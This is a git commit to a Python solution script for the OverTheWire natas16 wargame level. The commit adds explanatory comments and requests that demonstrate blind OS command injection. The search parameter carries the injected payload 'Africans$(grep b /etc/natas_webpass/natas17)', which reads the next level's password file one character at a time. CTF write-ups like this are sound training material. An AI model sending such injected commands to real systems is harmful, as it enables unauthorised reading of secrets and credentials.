a5705be568c30898ed08b4e885d69221d37947d0
Adrian Kristanto <49110670+adriankristanto@users.noreply.github.com>
2020-08-21 17:49:28 +1000

    added explanation of case 1 of the attack

--- natas16/natas16.py
+++ natas16/natas16.py
@@ -22,3 +22,25 @@ print(f'{div_content}\n')
 # which includes $, (, ), {, }
 # one way we can execute a command is through the use of $()
 # for example, $(grep a /etc/natas_webpass/natas17)
+# the idea of the attack is similar to blind SQL injection, in this case, it would be blind OS injection
+# see the following examples:
+# I. the word africans is in the dictionary.txt file, therefore, it will be returned to us by the webpage as the result of our search
+data = {
+    'needle' : 'Africans',
+    'submit' : 'submit'
+}
+response = session.post(URL, data=data)
+div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
+print(f'{div_content}\n')
+# II. case 1: next, we execute specific command using $() and send it along with our previous search query
+data = {
+    'needle' : 'Africans$(grep b /etc/natas_webpass/natas17)',
+    'submit' : 'submit'
+}
+# essentially, the command will search for the letter 'b' in the file /etc/natas_webpass/natas17
+# if it found it, it should return the word 'Africans' concatenated with the password, which is not in
+# dictionary.txt
+response = session.post(URL, data=data)
+div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
+print(f'{div_content}\n')
+# as we can see, nothing is returned as a result of our search, which means b is a letter in the password
